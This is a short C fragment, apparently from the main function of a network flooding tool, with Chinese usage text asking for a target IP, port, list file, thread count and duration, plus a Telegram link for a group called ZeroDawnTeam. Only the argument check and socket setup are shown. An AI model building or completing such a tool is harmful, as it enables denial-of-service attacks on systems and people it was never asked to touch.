...
{
	if(argc < 6){
	fprintf(stderr, "\x1b[1;31m 破晓(ZeroDown)官方频道：https://t.me/ZeroDawnTeam \n");
	fprintf(stdout, "\x1b[0;33m使用方法:\x1b[1;35m %s IP地址 端口号 表文件 线程数 -1 时间\n", argv[0]);
		exit(-1);
	}
	srand(time(NULL));
	int i = 0;
	head = NULL;
	fprintf(stdout, "\x1b[1;35m创建套接字...\n");
	int max_len = 128;
